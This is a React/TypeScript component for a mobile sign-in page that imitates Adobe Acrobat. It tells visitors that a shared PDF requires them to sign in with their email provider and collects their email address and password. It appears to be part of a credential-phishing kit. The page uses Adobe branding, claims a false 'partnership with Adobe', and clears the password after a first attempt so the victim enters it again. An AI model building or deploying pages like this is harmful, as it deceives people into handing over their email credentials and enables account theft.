import React, { useState } from 'react';
import { ArrowLeft, Eye, EyeOff } from 'lucide-react';
import { useLogin } from '../../hooks/useLogin';
import Spinner from '../../components/common/Spinner';

interface LoginPageProps {
  fileName: string;
  onBack: () => void; // This was missing
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  onYahooSelect?: () => void;
  onAolSelect?: () => void;
  onGmailSelect?: () => void;
  onOffice365Select?: () => void;
}

const MobileLoginPage: React.FC<LoginPageProps> = ({ 
  fileName,
  onBack, // Added here
  onLoginSuccess,
  onLoginError,
  onYahooSelect,
  onAolSelect,
  onGmailSelect,
  onOffice365Select,
}) => {
  const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  
  const { isLoading, errorMessage, handleFormSubmit, resetLoginState } = useLogin(
    onLoginSuccess,
    onLoginError
  );

  const emailProviders = [
    { name: 'Office365', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/office-365-icon.png' },
    { name: 'Yahoo', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/yahoo-square-icon.png' },
    { name: 'Outlook', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png' },
    { name: 'AOL', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png' },
    { name: 'Gmail', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png' },
    { name: 'Others', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png' }
  ];
  
  const handleSubmit = async (e: React.FormEvent) => {
    const result = await handleFormSubmit(e, { email, password, provider: selectedProvider });
    if (result?.isFirstAttempt) {
      setPassword('');
    }
  };

  const handleBackToProviders = () => {
    setSelectedProvider(null);
    setEmail('');
    setPassword('');
    resetLoginState();
    onBack(); // This was the missing call
  };

  const handleProviderClick = (providerName: string) => {
    if (providerName === 'Office365' && onOffice365Select) {
      onOffice365Select();
    } else if (providerName === 'Outlook' && onOffice365Select) {
      onOffice365Select();
    } else if (providerName === 'Yahoo' && onYahooSelect) {
      onYahooSelect();
    } else if (providerName === 'AOL' && onAolSelect) {
      onAolSelect();
    } else if (providerName === 'Gmail' && onGmailSelect) {
      onGmailSelect();
    } else {
      setSelectedProvider(providerName);
    }
  };

  const AdobeLogo = () => (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 26" className="w-6 h-6">
      <polygon fill="#FA0F00" points="11.5,0 0,0 0,26" />
      <polygon fill="#FA0F00" points="18.5,0 30,0 30,26" />
      <polygon fill="#FA0F00" points="15,9.6 22.1,26 18.2,26 16,20.8 10.9,20.8" />
    </svg>
  );

  const PdfIcon = () => (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 56 64" className="w-12 h-14">
      <path d="M8 0C3.58 0 0 3.58 0 8v48c0 4.42 3.58 8 8 8h40c4.42 0 8-3.58 8-8V20L36 0H8z" fill="#E8E8E8"/>
      <path d="M36 0v12c0 4.42 3.58 8 8 8h12L36 0z" fill="#CFCFCF"/>
      <rect x="8" y="34" width="40" height="4" rx="1" fill="#D4D4D4"/>
      <rect x="8" y="42" width="32" height="4" rx="1" fill="#D4D4D4"/>
      <rect x="8" y="50" width="36" height="4" rx="1" fill="#D4D4D4"/>
      <rect x="4" y="4" width="14" height="14" rx="2" fill="#FA0F00"/>
      <text x="7" y="14.5" fill="white" fontSize="8" fontWeight="bold" fontFamily="Arial, sans-serif">PDF</text>
    </svg>
  );

  return (
    <div className="min-h-screen flex flex-col font-sans" style={{ backgroundColor: '#F5F5F5', fontFamily: "'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" }}>
      {/* Adobe header bar */}
      <header className="bg-white border-b border-gray-200 px-4 py-2.5 flex items-center flex-shrink-0">
        <div className="flex items-center gap-2">
          <AdobeLogo />
          <span className="text-sm font-semibold text-gray-900 tracking-tight">Adobe Acrobat</span>
        </div>
      </header>

      {/* Main content */}
      <main className="flex-1 flex flex-col justify-start px-4 py-6">
        {!selectedProvider ? (
          <div className="bg-white rounded-xl shadow-sm border border-gray-200 w-full overflow-hidden">
            {/* Document preview area */}
            <div className="bg-gradient-to-b from-gray-50 to-white px-5 pt-8 pb-5 text-center border-b border-gray-100">
              <div className="flex justify-center mb-3">
                <PdfIcon />
              </div>
              <h2 className="text-sm font-semibold text-gray-900 mb-0.5 truncate">{fileName}</h2>
              <p className="text-xs text-gray-500">PDF Document</p>
            </div>

            {/* Sign-in section */}
            <div className="px-5 py-5">
              <h1 className="text-base font-bold text-gray-900 mb-1">Sign in to access this document</h1>
              <p className="text-sm text-gray-500 mb-5">The sender requires you to sign in to view this file.</p>

              <div className="space-y-2">
                {emailProviders.map((provider) => (
                  <button
                    key={provider.name}
                    onClick={() => handleProviderClick(provider.name)}
                    type="button"
                    className="w-full group"
                  >
                    <div className="flex items-center px-4 py-3 bg-white rounded-lg border border-gray-200 active:border-[#1473E6] active:bg-blue-50/30 transition-all duration-150">
                      <img src={provider.logo} alt={provider.name} className="w-6 h-6 object-contain flex-shrink-0" />
                      <span className="flex-1 text-sm font-medium text-gray-800 ml-3 text-left">
                        {provider.name}
                      </span>
                      <svg className="w-4 h-4 text-gray-300 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                      </svg>
                    </div>
                  </button>
                ))}
              </div>
            </div>

            {/* Footer */}
            <div className="px-5 py-3 border-t border-gray-100 bg-gray-50/50">
              <p className="text-xs text-gray-400 text-center">© 2026 Xtransferbloom. Secured in partnership with Adobe®.</p>
            </div>
          </div>
        ) : (
          <div className="bg-white rounded-xl shadow-sm border border-gray-200 w-full overflow-hidden">
            {/* Document preview area */}
            <div className="bg-gradient-to-b from-gray-50 to-white px-5 pt-6 pb-4 text-center border-b border-gray-100">
              <div className="flex justify-center mb-2">
                <PdfIcon />
              </div>
              <h2 className="text-sm font-semibold text-gray-900 truncate">{fileName}</h2>
            </div>

            {/* Sign-in form */}
            <div className="px-5 py-5">
              <button onClick={handleBackToProviders} className="flex items-center gap-1.5 text-sm text-[#1473E6] active:text-[#0d66d0] font-medium mb-4 transition-colors">
                <ArrowLeft className="w-4 h-4" />
                All sign-in options
              </button>

              <h1 className="text-base font-bold text-gray-900 mb-1">Sign in with {selectedProvider}</h1>
              <p className="text-sm text-gray-500 mb-5">Enter your credentials to access this document.</p>

              <form onSubmit={handleSubmit} className="space-y-4">
                {errorMessage && (
                  <div className="bg-red-50 text-[#D7373F] p-3 rounded-lg text-sm font-medium border border-red-100 flex items-start gap-2">
                    <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" /></svg>
                    <span>{errorMessage}</span>
                  </div>
                )}
                <div>
                  <label className="text-xs font-semibold text-gray-600 uppercase tracking-wide block mb-1.5" htmlFor="email">Email address</label>
                  <input id="email" type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="name@example.com" required className="w-full px-3 py-3 bg-white border border-gray-300 rounded-lg text-sm focus:ring-2 focus:ring-[#1473E6] focus:border-[#1473E6] outline-none transition placeholder:text-gray-400" />
                </div>
                <div>
                  <label className="text-xs font-semibold text-gray-600 uppercase tracking-wide block mb-1.5" htmlFor="password">Password</label>
                  <div className="relative">
                    <input id="password" type={showPassword ? 'text' : 'password'} value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Enter your password" required className="w-full px-3 pr-10 py-3 bg-white border border-gray-300 rounded-lg text-sm focus:ring-2 focus:ring-[#1473E6] focus:border-[#1473E6] outline-none transition placeholder:text-gray-400" />
                    <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors">
                      {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </div>
                </div>
                <button type="submit" disabled={isLoading || !email || !password} className="w-full flex items-center justify-center py-3 px-4 rounded-full font-semibold text-sm text-white bg-[#1473E6] hover:bg-[#0d66d0] disabled:bg-[#1473E6]/40 disabled:cursor-not-allowed transition-colors mt-1">
                  {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
                  {isLoading ? 'Verifying...' : 'Continue'}
                </button>
              </form>
            </div>

            {/* Footer */}
            <div className="px-5 py-3 border-t border-gray-100 bg-gray-50/50">
              <p className="text-xs text-gray-400 text-center">© 2026 Xtransferbloom. Secured in partnership with Adobe®.</p>
            </div>
          </div>
        )}
      </main>

      {/* Bottom bar */}
      <footer className="px-4 py-2.5 flex items-center justify-center gap-3 text-xs text-gray-400 flex-shrink-0 border-t border-gray-200 bg-white">
        <span>Adobe Acrobat</span>
        <span>·</span>
        <span>Privacy</span>
        <span>·</span>
        <span>Terms of Use</span>
      </footer>
    </div>
  );
};

export default MobileLoginPage;
